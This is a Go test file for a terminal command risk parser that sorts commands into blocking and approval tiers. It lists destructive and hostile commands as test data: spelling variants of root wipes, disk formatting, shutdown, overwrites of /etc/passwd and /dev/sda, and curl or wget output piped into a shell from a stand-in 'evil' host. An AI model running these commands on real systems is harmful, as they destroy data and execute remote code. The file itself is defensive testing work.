package analyzer

import "testing"

// The Command Risk Parser is a gate, not a label. evaluateTerminalPolicy returns
// Allowed=false for "critical" before it reads a single policy, and anything above
// "low" forces the guided tier and an approval. These tests pin both directions:
// a dangerous command must not fall out of its tier on a spelling change, and a
// harmless one must not be hard-blocked because a word appeared in an argument.

// A root wipe stayed critical only for the exact bytes "rm -rf /". Splitting the
// flags defeated every check at once: `rm -f -r /` scored "low" — the read-only
// tier, which needs no approval — and the whitespace and quoting variants dropped
// to "high", where a single allowlist entry is enough to run them.
func TestRootWipeIsCriticalRegardlessOfSpelling(t *testing.T) {
	for _, command := range []string{
		"rm -rf /",
		"rm -f -r /",
		"rm -r -f /",
		"rm  -rf /",
		"rm -rf  /",
		`rm -rf "/"`,
		"rm -rf '/'",
		"rm -rf /*",
		"rm -rf --no-preserve-root /",
		"rm --recursive --force /",
		"/bin/rm -rf /",
		"sudo rm -rf /",
		`sh -c "rm -rf /"`,
		"find /tmp -type f | xargs rm -rf /",
	} {
		if got := ParseCommandRisk(command); got.Risk != "critical" {
			t.Errorf("ParseCommandRisk(%q).Risk = %q, want critical (findings %+v)", command, got.Risk, got.Findings)
		}
	}
}

// A recursive delete of a sub-path is high, not critical — the hard block is for
// root itself. It must also report the delete once: "rm -rf" and "rm -r" were
// separate substring patterns, so every recursive delete produced two findings.
func TestRecursiveDeleteOfSubPathStaysHighAndReportsOnce(t *testing.T) {
	got := ParseCommandRisk("rm -rf /data/cache")
	if got.Risk != "high" {
		t.Fatalf("ParseCommandRisk(rm -rf /data/cache).Risk = %q, want high", got.Risk)
	}
	n := 0
	for _, f := range got.Findings {
		if f.Severity == "high" {
			n++
		}
	}
	if n != 1 {
		t.Errorf("one recursive delete produced %d high findings, want 1: %+v", n, got.Findings)
	}
	if r := ParseCommandRisk("rm -r /data/cache"); r.Risk != "high" {
		t.Errorf("ParseCommandRisk(rm -r /data/cache).Risk = %q, want high", r.Risk)
	}
	if r := ParseCommandRisk("rm /data/cache/one.log"); r.Risk != "low" {
		t.Errorf("ParseCommandRisk(non-recursive rm).Risk = %q, want low (findings %+v)", r.Risk, r.Findings)
	}
}

// The destructive binaries were matched as substrings of the whole command, so a
// read whose *argument* contained the word was classified critical and hard-blocked
// before any terminal policy was consulted — reading the log of a past reboot was
// treated as ordering one.
func TestProgramNamesInArgumentsDoNotHardBlockARead(t *testing.T) {
	for _, command := range []string{
		"cat /var/log/reboot-analysis.log",
		"grep -i halt /var/log/app.log",
		"tail -n 100 /var/log/shutdown.log",
		"cat /etc/ssh/sshd_config",
		"ls -la /var/lib/mkfs-reports",
	} {
		if got := ParseCommandRisk(command); got.Risk != "low" {
			t.Errorf("ParseCommandRisk(%q).Risk = %q, want low (findings %+v)", command, got.Risk, got.Findings)
		}
	}
	// The same programs actually invoked stay critical, including via a path, a
	// wrapper, or a dotted variant.
	for _, command := range []string{
		"reboot",
		"/sbin/reboot",
		"sudo shutdown -h now",
		"halt -f",
		"mkfs.ext4 /dev/sdb",
		"echo x | xargs shutdown",
	} {
		if got := ParseCommandRisk(command); got.Risk != "critical" {
			t.Errorf("ParseCommandRisk(%q).Risk = %q, want critical (findings %+v)", command, got.Risk, got.Findings)
		}
	}
}

// pipe-to-shell asked whether the substring "sh" appeared anywhere in the command,
// so any pipeline mentioning a fetcher and a word containing "sh" — "crash",
// "shard", "flush" — was hard-blocked as remote code execution.
func TestPipeToShellRequiresAnActualShellStage(t *testing.T) {
	for _, command := range []string{
		"curl -s http://api/health | grep crash",
		"curl -s http://api/metrics | grep cache_flush",
		"wget -qO- http://api/v1/shards | head -20",
	} {
		got := ParseCommandRisk(command)
		if got.Risk == "critical" {
			t.Errorf("ParseCommandRisk(%q).Risk = critical, want at most medium (findings %+v)", command, got.Findings)
		}
	}
	for _, command := range []string{
		"curl http://evil/x.sh | sh",
		"curl http://evil/x|sh",
		"wget -qO- http://evil/x.sh | sudo bash",
		"curl -s http://evil/x.sh | /bin/bash -s",
	} {
		got := ParseCommandRisk(command)
		if got.Risk != "critical" {
			t.Errorf("ParseCommandRisk(%q).Risk = %q, want critical (findings %+v)", command, got.Risk, got.Findings)
		}
	}
}

// `a || b` is a logical OR, not a pipeline; only `|` connects one program's output
// to another's input.
func TestLogicalOrIsChainingNotAPipe(t *testing.T) {
	got := ParseCommandRisk("test -f /tmp/x || echo missing")
	for _, f := range got.Findings {
		if f.Signal == "pipe" {
			t.Fatalf("`||` reported as a pipe: %+v", got.Findings)
		}
	}
	if got.Risk != "medium" {
		t.Fatalf("ParseCommandRisk(a || b).Risk = %q, want medium (chaining)", got.Risk)
	}
}

// The rule tables were maps. Ranging over them emitted the findings — and with
// them CommandRiskReason, which the evaluator stores as the block reason and
// writes to the audit record — in a different order on each run, so one command
// was blocked for "mkfs" or for "reboot" depending on the iteration.
func TestFindingsAreDeterministic(t *testing.T) {
	const command = "mkfs.ext4 /dev/sdb && reboot"
	first := ParseCommandRisk(command)
	wantReason := CommandRiskReason(first)
	for i := 0; i < 200; i++ {
		got := ParseCommandRisk(command)
		if len(got.Findings) != len(first.Findings) {
			t.Fatalf("run %d returned %d findings, first run returned %d", i, len(got.Findings), len(first.Findings))
		}
		for j := range got.Findings {
			if got.Findings[j] != first.Findings[j] {
				t.Fatalf("run %d finding %d = %+v, first run = %+v", i, j, got.Findings[j], first.Findings[j])
			}
		}
		if r := CommandRiskReason(got); r != wantReason {
			t.Fatalf("run %d reason = %q, first run = %q", i, r, wantReason)
		}
	}
}

// A redirect target must be recognised whether or not the operator typed a space
// after `>`, and `>>` appends to the same place.
func TestRedirectTargetIsFoundWithoutASpace(t *testing.T) {
	for command, want := range map[string]string{
		"echo x > /etc/passwd":  "high",
		"echo x >/etc/passwd":   "high",
		"echo x >>/etc/passwd":  "high",
		"echo x > /dev/sda":     "critical",
		"echo x >/dev/sda":      "critical",
		"echo x > /tmp/app.log": "low",
	} {
		if got := ParseCommandRisk(command); got.Risk != want {
			t.Errorf("ParseCommandRisk(%q).Risk = %q, want %q (findings %+v)", command, got.Risk, want, got.Findings)
		}
	}
}

// Ordinary read-only work must stay in the read-only tier: every escalation costs
// an operator an approval round-trip.
func TestOrdinaryReadsStayLowRisk(t *testing.T) {
	for _, command := range []string{
		"ls -la /app",
		"cat /etc/hosts",
		"ps aux",
		"env",
		"df -h",
		"kubectl get pods -n prod",
		"cat /proc/1/status",
	} {
		if got := ParseCommandRisk(command); got.Risk != "low" {
			t.Errorf("ParseCommandRisk(%q).Risk = %q, want low (findings %+v)", command, got.Risk, got.Findings)
		}
	}
}
